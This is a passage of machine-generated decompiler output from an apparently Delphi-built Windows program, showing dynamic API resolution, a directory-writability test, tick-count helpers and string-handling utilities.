  hModule = GetModuleHandleW_1(L"ntdll.dll");
  if ( hModule )
  {
    dword_4667B0 = (int)sub_40C598(hModule, L"ZwQueryInformationProcess");
    dword_4667B4 = (int)sub_40C598(hModule, L"NtQueryInformationThread");
  }
  dword_4667B8 = (int)sub_4214C0(9, (const CHAR *)L"RasSetCredentialsW");
  dword_4667BC = (int)sub_4214C0(9, (const CHAR *)L"RasEnumConnectionsW");
  dword_4667C0 = (int)sub_4214C0(9, (const CHAR *)L"RasGetConnectStatusW");
  dword_4667C4 = (int)sub_4214C0(11, (const CHAR *)&off_422364);
  dword_4667C8 = (int)sub_4214C0(11, (const CHAR *)&off_42239C);
  dword_4667CC = (int)sub_4214C0(11, (const CHAR *)&off_4223D8);
  dword_4667D0 = (int)sub_4214C0(11, (const CHAR *)&off_4223FC);
  dword_4667D4 = (int)sub_4214C0(11, (const CHAR *)&off_422420);
  dword_4667D8 = (int)sub_4214C0(11, (const CHAR *)&off_422440);
  dword_4667DC = (int)sub_4214C0(11, (const CHAR *)&off_422464);
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_421AAB;
  return sub_406CA4((int)&v14, 2);
}
// 42151C: variable 'v0' is possibly undefined
// 421575: variable 'v4' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 421ABC: using guessed type int dword_421ABC;
// 421AC0: using guessed type wchar_t aGetlogicalproc_1[31];
// 421B00: using guessed type wchar_t aGetlogicalproc_2[33];
// 421B44: using guessed type wchar_t aRegdeletekeyex[16];
// 421B64: using guessed type wchar_t aGetnativesyste_0[20];
// 421B8C: using guessed type wchar_t aIswow64process[15];
// 421BAC: using guessed type wchar_t aGetproductinfo[15];
// 421BCC: using guessed type wchar_t aQuerydosdevice[16];
// 421BEC: using guessed type wchar_t aGetlogicaldriv[24];
// 421C1C: using guessed type wchar_t aGetfinalpathna[26];
// 421C50: using guessed type wchar_t aWow64disablewo[31];
// 421C90: using guessed type wchar_t aWow64revertwow[30];
// 421CCC: using guessed type wchar_t aGetuserdefault[25];
// 421D00: using guessed type wchar_t aCreatehardlink[16];
// 421D20: using guessed type wchar_t aSetthreaddescr[21];
// 421D4C: using guessed type wchar_t aGetthreaddescr[21];
// 421D78: using guessed type wchar_t aGetsystemfirmw[23];
// 421DA8: using guessed type wchar_t aGettickcount64[15];
// 421DC8: using guessed type wchar_t aBaseflushappco[24];
// 421DF8: using guessed type wchar_t aPowercreatereq[19];
// 421E20: using guessed type wchar_t aPowersetreques[16];
// 421E40: using guessed type wchar_t aPowerclearrequ[18];
// 421E64: using guessed type wchar_t aGetfileversion[24];
// 421E94: using guessed type wchar_t aGetfileversion_0[20];
// 421EBC: using guessed type wchar_t aVerqueryvaluew[15];
// 421EDC: using guessed type wchar_t aGetmodulefilen[21];
// 421F08: using guessed type wchar_t aGetprocessimag[25];
// 421F3C: using guessed type wchar_t aGetprocessmemo[21];
// 421F68: using guessed type wchar_t aGetmoduleinfor[21];
// 421F94: using guessed type wchar_t aEnumprocessmod[19];
// 421FBC: using guessed type wchar_t aShutdownblockr[26];
// 421FF0: using guessed type wchar_t aShutdownblockr_0[25];
// 422024: using guessed type wchar_t aShutdownblockr_1[27];
// 42205C: using guessed type wchar_t aSetprocessdpia[19];
// 422084: using guessed type wchar_t aShgetknownfold[21];
// 4220B0: using guessed type wchar_t aShellNotifyico[24];
// 4220E0: using guessed type wchar_t aShqueryusernot[29];
// 42211C: using guessed type wchar_t aCocreateinstan[19];
// 422144: using guessed type wchar_t aCoinitializeex[15];
// 422164: using guessed type wchar_t aCoaddrefserver[22];
// 422190: using guessed type wchar_t aCoreleaseserve[23];
// 4221C0: using guessed type wchar_t aCoresumeclasso[21];
// 4221EC: using guessed type wchar_t aCosuspendclass[22];
// 422218: using guessed type wchar_t aSetprocessdpia_0[23];
// 422248: using guessed type wchar_t aGetdpiformonit[17];
// 4222E8: using guessed type wchar_t aRassetcredenti[19];
// 422310: using guessed type wchar_t aRasenumconnect[20];
// 422338: using guessed type wchar_t aRasgetconnects[21];
// 422364: using guessed type void *off_422364;
// 42239C: using guessed type void *off_42239C;
// 4223D8: using guessed type void *off_4223D8;
// 4223FC: using guessed type void *off_4223FC;
// 422420: using guessed type void *off_422420;
// 422440: using guessed type void *off_422440;
// 422464: using guessed type void *off_422464;
// 466700: using guessed type int dword_466700;
// 466704: using guessed type int dword_466704;
// 466708: using guessed type int dword_466708;
// 46670C: using guessed type int dword_46670C;
// 466710: using guessed type int dword_466710;
// 466714: using guessed type int dword_466714;
// 466718: using guessed type int dword_466718;
// 46671C: using guessed type int dword_46671C;
// 466720: using guessed type int dword_466720;
// 466724: using guessed type int dword_466724;
// 466728: using guessed type int dword_466728;
// 46672C: using guessed type int dword_46672C;
// 466730: using guessed type int dword_466730;
// 466734: using guessed type int dword_466734;
// 466738: using guessed type int dword_466738;
// 46673C: using guessed type int dword_46673C;
// 466740: using guessed type int dword_466740;
// 466744: using guessed type int dword_466744;
// 466748: using guessed type int dword_466748;
// 46674C: using guessed type int dword_46674C;
// 466750: using guessed type int dword_466750;
// 466754: using guessed type int dword_466754;
// 466758: using guessed type int dword_466758;
// 46675C: using guessed type int dword_46675C;
// 466760: using guessed type int dword_466760;
// 466764: using guessed type int dword_466764;
// 466768: using guessed type int dword_466768;
// 46676C: using guessed type int dword_46676C;
// 466770: using guessed type int dword_466770;
// 466774: using guessed type int dword_466774;
// 466778: using guessed type int dword_466778;
// 46677C: using guessed type int dword_46677C;
// 466780: using guessed type int dword_466780;
// 466784: using guessed type int dword_466784;
// 466788: using guessed type int dword_466788;
// 46678C: using guessed type int dword_46678C;
// 466790: using guessed type int dword_466790;
// 466794: using guessed type int dword_466794;
// 466798: using guessed type int dword_466798;
// 46679C: using guessed type int dword_46679C;
// 4667A0: using guessed type int dword_4667A0;
// 4667A4: using guessed type int dword_4667A4;
// 4667A8: using guessed type int dword_4667A8;
// 4667AC: using guessed type int dword_4667AC;
// 4667B0: using guessed type int dword_4667B0;
// 4667B4: using guessed type int dword_4667B4;
// 4667B8: using guessed type int dword_4667B8;
// 4667BC: using guessed type int dword_4667BC;
// 4667C0: using guessed type int dword_4667C0;
// 4667C4: using guessed type int dword_4667C4;
// 4667C8: using guessed type int dword_4667C8;
// 4667CC: using guessed type int dword_4667CC;
// 4667D0: using guessed type int dword_4667D0;
// 4667D4: using guessed type int dword_4667D4;
// 4667D8: using guessed type int dword_4667D8;
// 4667DC: using guessed type int dword_4667DC;
// 46E918: using guessed type HMODULE dword_46E918[12];

//----- (00422490) --------------------------------------------------------
void sub_422490()
{
  ++dword_46E948;
}
// 46E948: using guessed type int dword_46E948;

//----- (004224A0) --------------------------------------------------------
void sub_4224A0()
{
  ++dword_46E958;
}
// 46E958: using guessed type int dword_46E958;

//----- (004237C0) --------------------------------------------------------
unsigned __int64 sub_4237C0()
{
  unsigned __int64 TickCount_0; // [esp+0h] [ebp-10h]

  TickCount_0 = GetTickCount_0();
  if ( TickCount_0 < qword_46E968 )
    ++HIDWORD(qword_46E960);
  qword_46E968 = TickCount_0;
  return qword_46E960 + TickCount_0;
}
// 46E960: using guessed type __int64 qword_46E960;
// 46E968: using guessed type __int64 qword_46E968;

//----- (00423830) --------------------------------------------------------
__int64 __fastcall sub_423830(__int64 *a1)
{
  __int64 result; // rax

  result = dword_466834();
  *a1 = result;
  return result;
}
// 466834: using guessed type __int64 (*dword_466834)(void);

//----- (00423850) --------------------------------------------------------
__int64 __fastcall sub_423850(_QWORD *a1)
{
  __int64 v3; // [esp+4h] [ebp-10h] BYREF

  v3 = dword_466834();
  return sub_428CA0(&v3, a1);
}
// 466834: using guessed type __int64 (*dword_466834)(void);

//----- (00423880) --------------------------------------------------------
bool __fastcall sub_423880(_QWORD *a1, __int64 a2)
{
  return sub_428C90(a1) || sub_423850(a1) >= a2;
}

//----- (004238C0) --------------------------------------------------------
int sub_4238C0()
{
  return 0;
}

//----- (004238D0) --------------------------------------------------------
volatile __int32 *__fastcall sub_4238D0(volatile __int32 *a1)
{
  return sub_406FE8(a1, dword_466914);
}
// 466914: using guessed type int dword_466914;

//----- (004238F0) --------------------------------------------------------
volatile __int32 *__fastcall sub_4238F0(volatile __int32 *a1)
{
  return sub_406FE8(a1, dword_466918);
}
// 466918: using guessed type int dword_466918;

//----- (00423910) --------------------------------------------------------
int __fastcall sub_423910(int a1)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+0h] [ebp-Ch] BYREF
  int v5; // [esp+4h] [ebp-8h] BYREF
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = 0;
  v4 = 0;
  v6 = a1;
  System::__linkproc__ LStrAddRef(a1);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_42397F;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_406FE8(&dword_466914, v6);
  sub_4253F0(dword_466914, &v4);
  sub_425250(v4, &v5);
  sub_406FE8(&dword_466918, v5);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_423986;
  return sub_406CA4((int)&v4, 3);
}
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);
// 466914: using guessed type int dword_466914;
// 466918: using guessed type int dword_466918;

//----- (00423990) --------------------------------------------------------
DWORD sub_423990()
{
  return GetCurrentProcessId();
}

//----- (004239A0) --------------------------------------------------------
DWORD sub_4239A0()
{
  return GetCurrentThreadId_0();
}

//----- (004239B0) --------------------------------------------------------
int sub_4239B0()
{
  return dword_46691C;
}
// 46691C: using guessed type int dword_46691C;

//----- (00423AF0) --------------------------------------------------------
int __usercall sub_423AF0@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  char v6; // zf
  int *v8; // [esp-20h] [ebp-2Ch]
  _DWORD v9[5]; // [esp-14h] [ebp-20h] BYREF
  __int32 v10; // [esp+0h] [ebp-Ch] BYREF
  __int32 v11; // [esp+4h] [ebp-8h] BYREF
  int v12; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9[4] = a3;
  v9[3] = a4;
  v9[2] = &savedregs;
  v9[1] = &loc_423BAE;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_407AD8(a1, 1, 1, &v12);
  sub_407AA0(v12, (int)dword_423BC8);
  if ( v6
    || (sub_414CB4(a1, &v11), (int)sub_407B7C((int)&str___0[1], v11, 1) <= 0)
    && (sub_414CB4(a1, &v10), (int)sub_407B7C((int)dword_423BE8, v10, 1) <= 0) )
  {
    sub_406FE8(a2, a1);
  }
  else
  {
    v8 = dword_423BC8;
    sub_4079F0((int *)a2, 3);
  }
  __writefsdword(0, (unsigned int)v8);
  return sub_406CA4((int)&v10, 3);
}
// 423AF0: could not find valid save-restore pair for ebx
// 423AF0: could not find valid save-restore pair for esi
// 423B2F: variable 'v6' is possibly undefined
// 423B98: variable 'v8' is possibly undefined
// 423BC8: using guessed type int dword_423BC8[2];
// 423BD0: using guessed type _strings str___0[1];
// 423BE8: using guessed type int dword_423BE8[2];

//----- (00423BF0) --------------------------------------------------------
BOOL __fastcall sub_423BF0(__int32 a1, char a2)
{
  bool v3; // cf
  char v4; // dl
  DWORD CurrentProcessId; // esi
  int v6; // eax
  DWORD v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-24h] [ebp-50h] BYREF
  void *v10; // [esp-20h] [ebp-4Ch]
  int *v11; // [esp-1Ch] [ebp-48h]
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp-18h] [ebp-44h] BYREF
  int *v13; // [esp-14h] [ebp-40h]
  int *v14; // [esp-10h] [ebp-3Ch]
  unsigned int v15[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v16; // [esp-4h] [ebp-30h]
  void *v17; // [esp+8h] [ebp-24h] BYREF
  void *v18; // [esp+Ch] [ebp-20h] BYREF
  __int32 v19; // [esp+10h] [ebp-1Ch] BYREF
  __int32 v20; // [esp+14h] [ebp-18h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v21; // [esp+18h] [ebp-14h] BYREF
  _DWORD *v22; // [esp+1Ch] [ebp-10h]
  bool v23; // [esp+23h] [ebp-9h]
  void *v24; // [esp+24h] [ebp-8h] BYREF
  Xmlschema::TXMLSchemaDoc *v25; // [esp+28h] [ebp-4h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_423DB7;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v23 = 0;
  v3 = a2 == 0;
  v4 = a2 - 1;
  if ( v3 )
  {
    CurrentProcessId = GetCurrentProcessId();
    v14 = (int *)a1;
    v13 = dword_423DD4;
    unknown_libname_74(CurrentProcessId, &v21);
    v12 = v21;
    sub_4079F0((int *)&v25, 3);
    v22 = (_DWORD *)sub_425590((int)v25, 0);
    if ( v22 )
    {
      v11 = &savedregs;
      v10 = &loc_423CB8;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      v6 = sub_4071C0((volatile __int32 *)&v25);
      if ( (*(int (__fastcall **)(_DWORD *, int, int))(*v22 + 16))(v22, v6, 1) == 1 )
      {
        v23 = 1;
        __writefsdword(0, (unsigned int)ExceptionList);
        v11 = (int *)&loc_423D8F;
        sub_405598(v22);
        sub_426BB0((int)v25);
      }
      else
      {
        System::__linkproc__ TryFinallyExit(ExceptionList, v10, v11);
      }
    }
  }
  else if ( !v4 )
  {
    sub_407030((volatile __int32 *)&v25, a1);
    while ( System::__linkproc__ LStrLen(v25) > 2
         && !(unsigned __int8)Xmlschema::TXMLSchemaDoc::CheckSchemaVersion(v25)
         && !(unsigned __int8)sub_426C90((int)v25) )
    {
      sub_4252A0((int)v25, &v19);
      sub_4253F0(v19, &v20);
      sub_407030((volatile __int32 *)&v25, v20);
    }
    v14 = &savedregs;
    v13 = (int *)&loc_423D6F;
    v12 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v12);
    sub_425250((int)v25, (volatile __int32 *)&v18);
    sub_407968((volatile __int32 *)&v24, v18, L"dirtest_");
    v7 = GetCurrentProcessId();
    unknown_libname_74(v7, &v17);
    sub_407968((volatile __int32 *)&v25, v24, v17);
    __writefsdword(0, (unsigned int)v12);
    v14 = (int *)&loc_423D76;
    sub_406C44(&v24);
    v23 = sub_426D20((int)v25);
    if ( v23 )
      sub_426D40((int)v25);
  }
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_423DBE;
  sub_406CA4((int)&v17, 5);
  sub_406CA4((int)&v24, 2);
  return v23;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 423DD4: using guessed type int dword_423DD4[4];
// 423DE4: using guessed type wchar_t aDirtest[9];

//----- (00423E00) --------------------------------------------------------
BOOL __usercall sub_423E00@<eax>(int a1@<eax>, char a2@<dl>, BOOL a3@<ebx>)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+8h] [ebp-8h] BYREF
  char v8; // [esp+Fh] [ebp-1h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v7 = 0;
  v8 = a2;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_423E76;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  LOBYTE(a3) = 1;
  if ( (a2 & 1) != 0 )
  {
    sub_425250(a1, &v7);
    sub_407910(&v7, L"writefiletest");
    a3 = sub_423BF0(v7, 0);
  }
  if ( a3 && (v8 & 2) != 0 )
    a3 = sub_423BF0(a1, 1);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_423E7D;
  sub_406C44(&v7);
  return a3;
}
// 423E94: using guessed type wchar_t aWritefiletest[14];

//----- (00423EB0) --------------------------------------------------------
_DWORD *__fastcall sub_423EB0(Classes::TStream *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v5; // eax
  int v6; // edx
  _DWORD *v7; // eax

  result = sub_406C68(a2);
  if ( this )
  {
    Classes::TStream::SetPosition(this, 0i64);
    v5 = (**(int (__fastcall ***)(Classes::TStream *))this)(this);
    sub_4075BC(a2, v5, 0);
    result = (_DWORD *)*a2;
    if ( *a2 )
      result = (_DWORD *)*(result - 1);
    if ( result )
    {
      v6 = sub_4071C8(a2);
      v7 = (_DWORD *)*a2;
      if ( *a2 )
        v7 = (_DWORD *)*(v7 - 1);
      return (_DWORD *)(*(int (__fastcall **)(Classes::TStream *, int, _DWORD *))(*(_DWORD *)this + 12))(this, v6, v7);
    }
  }
  return result;
}
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (00423F10) --------------------------------------------------------
int __fastcall sub_423F10(__int32 a1, __int32 a2, int a3, volatile __int32 *a4)
{
  int v5; // eax
  int v6; // ebx
  __int32 v7; // esi
  __int32 v8; // edi
  unsigned int v10[2]; // [esp-18h] [ebp-30h] BYREF
  int *v11; // [esp-10h] [ebp-28h]
  int v12[2]; // [esp+0h] [ebp-18h] BYREF
  __int32 v13; // [esp+8h] [ebp-10h]
  void *v14; // [esp+Ch] [ebp-Ch] BYREF
  __int32 v15; // [esp+10h] [ebp-8h] BYREF
  __int32 v16; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v12[0] = 0;
  v12[1] = a3;
  v13 = a2;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_424023;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_4070CC(&v16, a1);
  sub_4070CC(&v15, v13);
  sub_4070CC((volatile __int32 *)&v14, a1);
  sub_406C68(a4);
  while ( v16 )
  {
    v5 = Strutils::PosEx(v15, v16, 1);
    v6 = v5;
    if ( !v5 )
    {
      sub_4072D4(a4, v14);
      break;
    }
    sub_407510((int)v14, 1, v5 - 1, v12);
    sub_4073B0((__int32 *)a4, 3);
    v7 = v13;
    if ( v13 )
      v7 = *(_DWORD *)(v13 - 4);
    sub_407510((int)v14, v7 + v6, 0x7FFFFFFF, &v14);
    v8 = v15;
    if ( v15 )
      v8 = *(_DWORD *)(v15 - 4);
    sub_407510(v16, v8 + v6, 0x7FFFFFFF, &v16);
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_42402A;
  sub_406C68(v12);
  return sub_406CD4((int)&v14, 3);
}
// 407C4C: using guessed type int __fastcall Strutils::PosEx(_DWORD, _DWORD, _DWORD);

//----- (00424040) --------------------------------------------------------
int __fastcall sub_424040(int a1, int a2, char a3)
{
  int v4; // eax
  int v5; // edx
  int v6; // eax
  int v7; // ebx
  char v8; // zf
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v12; // [esp-4h] [ebp-1Ch]
  int cchCount1; // [esp+8h] [ebp-10h] BYREF
  int v14; // [esp+Ch] [ebp-Ch] BYREF
  char v15; // [esp+13h] [ebp-5h]
  int v16; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  cchCount1 = 0;
  v14 = 0;
  v15 = a3;
  v16 = a2;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_4240F2;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v4 = a2;
  if ( a2 )
    v4 = *(_DWORD *)(a2 - 4);
  v5 = v4;
  v6 = a1;
  if ( a1 )
    v6 = *(_DWORD *)(a1 - 4);
  if ( v6 <= v5 )
  {
    if ( v15 )
    {
      sub_407AD8(v16, 1, v6, &v14);
      v9 = sub_407AA0(v14, a1);
      LOBYTE(v9) = v8;
    }
    else
    {
      sub_407AD8(v16, 1, v6, &cchCount1);
      v9 = sub_426AB0(cchCount1, a1);
      LOBYTE(v9) = v9 == 0;
    }
    v7 = v9;
  }
  else
  {
    v7 = 0;
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_4240F9;
  sub_406CA4((int)&cchCount1, 2);
  return v7;
}
// 4240AC: variable 'v8' is possibly undefined
// 424040: using guessed type int var_C;

//----- (00424110) --------------------------------------------------------
int __fastcall sub_424110(int a1, int a2, char a3)
{
  int v3; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ebx
  char v7; // zf
  int v8; // eax
  unsigned int v10[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v11; // [esp-4h] [ebp-20h]
  int cchCount1; // [esp+8h] [ebp-14h] BYREF
  int v13; // [esp+Ch] [ebp-10h] BYREF
  char v14; // [esp+13h] [ebp-9h]
  int v15; // [esp+14h] [ebp-8h]
  int v16; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  cchCount1 = 0;
  v13 = 0;
  v14 = a3;
  v15 = a2;
  v16 = a1;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_4241C6;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v3 = a2;
  if ( a2 )
    v3 = *(_DWORD *)(a2 - 4);
  v4 = v3;
  v5 = v16;
  if ( v16 )
    v5 = *(_DWORD *)(v16 - 4);
  if ( v5 <= v4 )
  {
    if ( v14 )
    {
      sub_407AD8(v15, v4 - v5 + 1, v5, &v13);
      v8 = sub_407AA0(v13, v16);
      LOBYTE(v8) = v7;
    }
    else
    {
      sub_407AD8(v15, v4 - v5 + 1, v5, &cchCount1);
      v8 = sub_426AB0(cchCount1, v16);
      LOBYTE(v8) = v8 == 0;
    }
    v6 = v8;
  }
  else
  {
    v6 = 0;
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_4241CD;
  sub_406CA4((int)&cchCount1, 2);
  return v6;
}
// 42417F: variable 'v7' is possibly undefined
// 424110: using guessed type int var_10;

//----- (004241E0) --------------------------------------------------------
int __fastcall sub_4241E0(int a1, int a2, int a3)
{
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  int v6; // edi
  int v7; // esi
  int i; // edx
  int v9; // eax
  int v11; // [esp+Ch] [ebp-10h]
  int v12; // [esp+10h] [ebp-Ch]

  v3 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  v4 = a1;
  v5 = a2;
  if ( a2 )
    v5 = *(_DWORD *)(a2 - 4);
  v6 = v5 - a3 - v4 + 1;
  if ( a3 <= 0 || v6 < 0 || v4 <= 0 )
    return 0;
  v12 = sub_407790(v3);
  v7 = 2 * (a3 - 1) + sub_407790(a2);
  v11 = v6 + 1;
  for ( i = 0; ; ++i )
  {
    v9 = 0;
    while ( v9 >= 0 && v4 > v9 )
    {
      if ( *(_WORD *)(v7 + 2 * (v9 + i)) == *(_WORD *)(v12 + 2 * v9) )
        ++v9;
      else
        v9 = -1;
    }
    if ( v4 <= v9 )
      break;
    if ( !--v11 )
      return 0;
  }
  return a3 + i;
}
// 42423E: conditional instruction was optimized away because edi.4>=0

//----- (00424290) --------------------------------------------------------
int __fastcall sub_424290(unsigned __int16 *a1, _BYTE *a2, int a3)
{
  int i; // edi
  bool v5; // cf
  char v6; // al
  bool v7; // cf
  char v8; // dl
  unsigned __int16 v9; // dx
  bool v10; // cf
  unsigned __int16 v11; // dx
  bool v12; // cf
  bool v13; // cf
  unsigned __int16 v14; // dx
  bool v15; // cf
  char v18; // [esp+28h] [ebp-1Ch]
  bool v19; // [esp+38h] [ebp-Ch]

  for ( i = a3; i > 0; --i )
  {
    v5 = *a1 < 0xFFu;
    if ( *a1 <= 0xFFu )
      v5 = _bittest(&dword_42442C, *a1);
    if ( v5 )
    {
      v6 = 1;
    }
    else
    {
      v7 = *a1 < 0xFFu;
      if ( *a1 <= 0xFFu )
        v7 = _bittest(dword_42444C, *a1);
      v6 = v7;
    }
    if ( v6 )
    {
      v8 = 1;
    }
    else
    {
      v9 = a1[1];
      v10 = v9 < 0xFFu;
      if ( v9 <= 0xFFu )
        v10 = _bittest(&dword_42442C, v9);
      if ( v10 )
      {
        v18 = 1;
      }
      else
      {
        v11 = a1[1];
        v12 = v11 < 0xFFu;
        if ( v11 <= 0xFFu )
          v12 = _bittest(dword_42444C, v11);
        v18 = v12;
      }
      v8 = v18;
    }
    if ( v8 )
      break;
    v13 = *a1 < 0xFFu;
    if ( *a1 <= 0xFFu )
      v13 = _bittest(&dword_42446C, *a1);
    if ( v13 )
    {
      v14 = a1[1];
      v15 = v14 < 0xFFu;
      if ( v14 <= 0xFFu )
        v15 = _bittest(&dword_42446C, v14);
      v19 = !v15;
    }
    else
    {
      v19 = 1;
    }
    if ( v19 )
      break;
    *a2++ = word_4668D6[*((unsigned __int8 *)a1 + 2)] + 16 * word_4668D6[*(unsigned __int8 *)a1];
    a1 += 2;
  }
  return a3 - i;
}
// 42442C: using guessed type int dword_42442C;
// 42444C: using guessed type int dword_42444C[2];
// 42446C: using guessed type int dword_42446C;
// 4668D6: using guessed type __int16 word_4668D6[31];

//----- (00424490) --------------------------------------------------------
_DWORD *__fastcall sub_424490(int a1, int a2, _DWORD *a3)
{
  int v3; // esi
  int v4; // edx
  int v5; // eax
  int v6; // ebx

  v3 = a1;
  v4 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  if ( a1 < a2 )
  {
    v5 = v4;
    if ( v4 )
      v5 = *(_DWORD *)(v4 - 4);
    a2 = v5;
  }
  v6 = v4;
  if ( v4 )
    v6 = *(_DWORD *)(v4 - 4);
  return sub_407AD8(v3, v6 + 1 - a2, a2, a3);
}

//----- (004244F0) --------------------------------------------------------
unsigned __int8 __fastcall sub_4244F0(_BYTE *a1, unsigned __int8 **a2)
{
  int v3; // eax
  int v4; // ebx
  unsigned __int8 result; // al
  unsigned __int8 *v6; // ecx
  unsigned __int8 *v7; // edx

  sub_406C68(a2);
  v3 = (int)a1;
  if ( a1 )
    v3 = *((_DWORD *)a1 - 1);
  v4 = v3;
  result = (unsigned __int8)sub_4075BC(a2, v3, 0);
  if ( v4 > 0 )
  {
    v6 = *a2;
    v7 = a1;
    do
    {
      result = *v7;
      if ( (unsigned __int8)(*v7 - 97) < 0x1Au )
        result ^= 0x20u;
      *v6++ = result;
      ++v7;
    }
    while ( &a1[v4] != v7 );
  }
  return result;
}

//----- (00424550) --------------------------------------------------------
unsigned __int16 __fastcall sub_424550(_WORD *a1, unsigned __int16 **a2)
{
  int v4; // ecx
  int v5; // eax
  int v6; // esi
  unsigned __int16 result; // ax
  unsigned __int16 *v8; // ecx
  unsigned __int16 *v9; // ebx
  int v10; // edx

  sub_406C44(a2);
  v5 = (int)a1;
  if ( a1 )
    v5 = *((_DWORD *)a1 - 1);
  v6 = v5;
  result = (unsigned __int16)sub_407890(a2, v5, v4);
  if ( v6 > 0 )
  {
    v8 = *a2;
    v9 = a1;
    v10 = v6;
    do
    {
      result = *v9;
      if ( (unsigned __int16)(*v9 - 65) < 0x1Au )
        result |= 0x20u;
      *v8++ = result;
      ++v9;
      --v10;
    }
    while ( v10 );
  }
  return result;
}
// 424584: conditional instruction was optimized away because esi.4>=1
// 424572: variable 'v4' is possibly undefined

//----- (004245B0) --------------------------------------------------------
unsigned __int8 __fastcall sub_4245B0(_BYTE *a1, unsigned __int8 **a2)
{
  int v3; // eax
  unsigned __int8 result; // al
  unsigned __int8 *v5; // ecx
  unsigned __int8 *v6; // esi
  int v7; // edx
  int v8; // [esp+8h] [ebp-8h]

  sub_406C68(a2);
  v3 = (int)a1;
  if ( a1 )
    v3 = *((_DWORD *)a1 - 1);
  v8 = v3;
  result = (unsigned __int8)sub_4075BC(a2, v3, 0);
  if ( v8 > 0 )
  {
    v5 = *a2;
    v6 = a1;
    v7 = v8;
    do
    {
      result = *v6;
      if ( (unsigned __int8)(*v6 - 65) < 0x1Au )
        result |= 0x20u;
      *v5++ = result;
      ++v6;
      --v7;
    }
    while ( v7 );
  }
  return result;
}
// 4245F0: conditional instruction was optimized away because %var_8.4>=1

//----- (00424610) --------------------------------------------------------
int *__fastcall sub_424610(int *result)
{
  int v1; // edx
  int i; // ebx

  v1 = *result;
  if ( *result )
    v1 = *(_DWORD *)(v1 - 4);
  if ( v1 > 0 )
  {
    for ( i = 1; *(_WORD *)(*result + 2 * i - 2); ++i )
    {
      if ( !--v1 )
        return result;
    }
    return sub_407890(result, i - 1, *result);
  }
  return result;
}

//----- (00424650) --------------------------------------------------------
int *__fastcall sub_424650(int *result)
{
  int v1; // edx
  int i; // ebx

  v1 = *result;
  if ( *result )
    v1 = *(_DWORD *)(v1 - 4);
  if ( v1 > 0 )
  {
    for ( i = 1; *(_BYTE *)(*result + i - 1); ++i )
    {
      if ( !--v1 )
        return result;
    }
    return sub_4075BC(result, i - 1, 0);
  }
  return result;
}

//----- (00424690) --------------------------------------------------------
_DWORD *__fastcall sub_424690(unsigned int a1, int *a2)
{
  return sub_4154C8(8, a2, a1);
}

//----- (004246C0) --------------------------------------------------------
int __fastcall sub_4246C0(int a1)
{
  int v2; // eax
  int v3; // edx

